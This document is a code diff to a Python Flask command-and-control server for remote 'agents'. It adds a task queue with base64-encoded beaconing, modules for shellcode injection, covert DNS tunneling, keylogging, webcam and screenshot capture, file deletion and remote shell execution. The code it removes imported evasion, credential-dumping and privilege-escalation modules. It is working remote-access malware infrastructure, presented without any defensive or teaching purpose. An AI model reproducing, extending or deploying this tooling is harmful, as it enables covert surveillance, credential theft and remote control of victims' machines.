@@ -12,35 +12,46 @@ import requests
 from typing import Optional, Dict, List, Any
 
 from flask import Flask, render_template, request, jsonify
+from flask_login import LoginManager, login_required
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('c2_server.log'),
+        logging.StreamHandler()
+    ]
+)
 
 # Fix: Add correct module path BEFORE importing
 MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), 'modules'))
 if MODULES_PATH not in sys.path:
     sys.path.append(MODULES_PATH)
 
-from modules.shellcode_generator import ShellcodeGenerator
-from modules.dns_tunnel import create_server
+# Import modules
+from modules.shellcode import ShellcodeGenerator
+from modules.dns_tunnel import DNSTunnel, create_server
+from modules.system import get_info
+from modules.process import list_processes, kill_process
+from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger
+from modules.files import list_directory, get_file_info, read_file, write_file, delete_file
+from modules.shell import execute
 
-IS_WINDOWS = platform.system().lower() == "windows"
-if IS_WINDOWS:
-    try:
-        from evasion import Evasion
-        from keylogger import Keylogger
-        from webcam import WebcamCapture
-        from process_injection import ProcessInjector
-        from credential_dump import CredentialDump
-        from priv_esc import PrivilegeEscalation
-        from post_exploit import PostExploit
-    except ImportError as e:
-        logging.warning(f"Failed to import Windows-specific modules: {e}")
-
-# Logging setup
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
+# Initialize Flask app
 app = Flask(__name__)
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
+
+# Initialize login manager
+login_manager = LoginManager()
+login_manager.init_app(app)
+login_manager.login_view = 'login'
+
+# Initialize components
 shellcode_gen = ShellcodeGenerator()
 dns_tunnel = create_server("example.com")
 
+# Data stores
 agents = {}
 tasks = {}
 results = {}
@@ -174,125 +185,253 @@ def agent_beacon():
         logging.error(f"Beacon error: {str(e)}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-@app.route('/api/tasks/<agent_id>', methods=['GET'])
-def get_tasks(agent_id):
-    return jsonify(tasks.get(agent_id, []))
-
 @app.route('/api/tasks', methods=['POST'])
 def create_task():
-    data = request.get_json()
-    agent_id = data.get('agent_id')
-    task_type = data.get('type')
-    task_data = data.get('data', {})
-
-    if not agent_id or not task_type:
-        return jsonify({'status': 'error'}), 400
-
-    task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-    task = {
-        'id': task_id,
-        'type': task_type,
-        'data': task_data,
-        'status': 'pending',
-        'timestamp': datetime.now().isoformat()
-    }
-
-    if agent_id not in tasks:
-        tasks[agent_id] = []
-    tasks[agent_id].append(task)
-
-    thread = threading.Thread(
-        target=execute_task,
-        args=(agent_id, task_id, task_type, task_data),
-        daemon=True
-    )
-    thread.start()
-
-    return jsonify({'task_id': task_id})
-
-@app.route('/api/results', methods=['POST'])
-def receive_result():
     try:
         data = request.get_json()
-        agent_id = data.get("agent_id")
-        task_id = data.get("task_id")
-        result = data.get("result")
+        agent_id = data.get('agent_id')
+        module = data.get('module')
+        params = data.get('params', {})
 
-        if agent_id not in results:
-            results[agent_id] = {}
-        results[agent_id][task_id] = result
-
-        if agent_id in agents:
-            agents[agent_id]['results'][task_id] = result
-
-        logging.info(f"[+] Result received from {agent_id} for {task_id}")
-        return jsonify({'status': 'ok'})
-    except Exception as e:
-        logging.error(f"Error receiving result: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-def execute_task(agent_id, task_id, task_type, task_data):
-    logging.info(f"Task {task_id} assigned to {agent_id} — {task_type}")
-    # Agent will pull and execute
-
-@app.route('/control', methods=['GET'])
-def control_panel():
-    return render_template('control.html')
-
-@app.route('/send_task', methods=['POST'])
-def send_task_from_ui():
-    try:
-        agent_id = request.form.get("agent_id")
-        task_type = request.form.get("task")
-
-        if not agent_id or not task_type:
+        if not agent_id or not module:
             return jsonify({
-                "status": "error",
-                "message": "Missing agent_id or task_type"
+                'status': 'error',
+                'message': 'Missing required fields'
             }), 400
 
-        # Validate agent exists
-        if agent_id not in agents:
-            return jsonify({
-                "status": "error",
-                "message": "Agent not found"
-            }), 404
-
-        # Create task directly
         task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
         task = {
             'id': task_id,
-            'type': task_type,
-            'data': {},
+            'module': module,
+            'params': params,
             'status': 'pending',
             'timestamp': datetime.now().isoformat()
         }
 
-        # Initialize task list for agent if needed
         if agent_id not in tasks:
             tasks[agent_id] = []
         tasks[agent_id].append(task)
 
-        # Start task execution thread
-        thread = threading.Thread(
-            target=execute_task,
-            args=(agent_id, task_id, task_type, {}),
-            daemon=True
-        )
-        thread.start()
-
-        logging.info(f"Task {task_id} created for agent {agent_id}")
+        logging.info(f"Created task {task_id} for agent {agent_id}: {module}")
         return jsonify({
-            "status": "sent",
-            "task_id": task_id,
-            "message": f"Task {task_type} sent to agent {agent_id}"
+            'status': 'success',
+            'task_id': task_id
         })
 
     except Exception as e:
         logging.error(f"Error creating task: {str(e)}")
         return jsonify({
-            "status": "error",
-            "message": str(e)
+            'status': 'error',
+            'message': str(e)
+        }), 500
+
+@app.route('/api/tasks/<agent_id>', methods=['GET'])
+def get_tasks(agent_id):
+    try:
+        if agent_id not in agents:
+            return jsonify({
+                'status': 'error',
+                'message': 'Unknown agent'
+            }), 404
+
+        # Update agent's last seen timestamp
+        agents[agent_id]['last_seen'] = datetime.now().isoformat()
+
+        # Get pending tasks
+        agent_tasks = tasks.get(agent_id, [])
+        if not agent_tasks:
+            return jsonify([])
+
+        # Get the next task
+        next_task = agent_tasks.pop(0)
+
+        # Encode task data
+        task_data = {
+            'task_id': next_task['id'],
+            'module': next_task['module'],
+            'params': next_task['params']
+        }
+        encoded_data = base64.b64encode(json.dumps(task_data).encode()).decode()
+
+        return jsonify({'data': encoded_data})
+
+    except Exception as e:
+        logging.error(f"Error getting tasks for agent {agent_id}: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
+        }), 500
+
+@app.route('/api/results', methods=['POST'])
+def receive_result():
+    try:
+        wrapper = request.get_json()
+        encoded_data = wrapper.get('data')
+        if not encoded_data:
+            return jsonify({
+                'status': 'error',
+                'message': 'Missing data'
+            }), 400
+
+        # Decode data
+        decoded_json = base64.b64decode(encoded_data).decode()
+        data = json.loads(decoded_json)
+
+        agent_id = data.get('agent_id')
+        task_id = data.get('task_id')
+        result = data.get('result')
+        timestamp = data.get('timestamp', datetime.now().isoformat())
+
+        if not agent_id or not task_id:
+            return jsonify({
+                'status': 'error',
+                'message': 'Missing required fields'
+            }), 400
+
+        # Store result
+        if agent_id not in results:
+            results[agent_id] = {}
+        
+        results[agent_id][task_id] = {
+            'result': result,
+            'timestamp': timestamp,
+            'processed': False
+        }
+
+        # Update agent's results
+        if agent_id in agents:
+            if 'results' not in agents[agent_id]:
+                agents[agent_id]['results'] = {}
+            agents[agent_id]['results'][task_id] = result
+
+        logging.info(f"Received result from agent {agent_id} for task {task_id}")
+        return jsonify({'status': 'success'})
+
+    except Exception as e:
+        logging.error(f"Error processing result: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
+        }), 500
+
+@app.route('/control')
+@login_required
+def control_panel():
+    return render_template('control.html')
+
+@app.route('/modules')
+@login_required
+def module_manager():
+    modules = {
+        'system': {
+            'name': 'System Information',
+            'description': 'System information gathering module',
+            'functions': ['get_info']
+        },
+        'process': {
+            'name': 'Process Management',
+            'description': 'Process listing and control',
+            'functions': ['list_processes', 'kill_process']
+        },
+        'surveillance': {
+            'name': 'Surveillance',
+            'description': 'Screenshot, webcam, and keylogging capabilities',
+            'functions': ['take_screenshot', 'capture_webcam', 'start_keylogger', 'stop_keylogger']
+        },
+        'files': {
+            'name': 'File Operations',
+            'description': 'File system operations',
+            'functions': ['list_directory', 'get_file_info', 'read_file', 'write_file', 'delete_file']
+        },
+        'shellcode': {
+            'name': 'Shellcode',
+            'description': 'Shellcode generation and injection',
+            'functions': ['generate', 'inject']
+        },
+        'dns_tunnel': {
+            'name': 'DNS Tunneling',
+            'description': 'Covert communication channel',
+            'functions': ['start', 'stop']
+        },
+        'shell': {
+            'name': 'Shell',
+            'description': 'Command execution',
+            'functions': ['execute']
+        }
+    }
+    return render_template('modules.html', modules=modules)
+
+@app.route('/api/modules/list', methods=['GET'])
+@login_required
+def list_modules():
+    """Get list of available modules and their capabilities"""
+    try:
+        modules = {
+            'system': ['get_info'],
+            'process': ['list_processes', 'kill_process'],
+            'surveillance': ['take_screenshot', 'capture_webcam', 'start_keylogger', 'stop_keylogger'],
+            'files': ['list_directory', 'get_file_info', 'read_file', 'write_file', 'delete_file'],
+            'shellcode': ['generate', 'inject'],
+            'dns_tunnel': ['start', 'stop'],
+            'shell': ['execute']
+        }
+        return jsonify({
+            'status': 'success',
+            'modules': modules
+        })
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
+        }), 500
+
+@app.route('/send_task', methods=['POST'])
+@login_required
+def send_task_from_ui():
+    """Handle task creation from the web interface"""
+    try:
+        agent_id = request.form.get('agent_id')
+        module = request.form.get('module')
+        params = request.form.get('params', '{}')
+
+        if not agent_id or not module:
+            return jsonify({
+                'status': 'error',
+                'message': 'Missing required fields'
+            }), 400
+
+        # Parse parameters
+        try:
+            params = json.loads(params)
+        except json.JSONDecodeError:
+            params = {}
+
+        # Create task
+        task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+        task = {
+            'id': task_id,
+            'module': module,
+            'params': params,
+            'status': 'pending',
+            'timestamp': datetime.now().isoformat()
+        }
+
+        # Add task to queue
+        if agent_id not in tasks:
+            tasks[agent_id] = []
+        tasks[agent_id].append(task)
+
+        logging.info(f"Task {task_id} created for agent {agent_id}: {module}")
+        return jsonify({
+            'status': 'success',
+            'task_id': task_id
+        })
+
+    except Exception as e:
+        logging.error(f"Error creating task from UI: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
         }), 500
 
 if __name__ == "__main__":
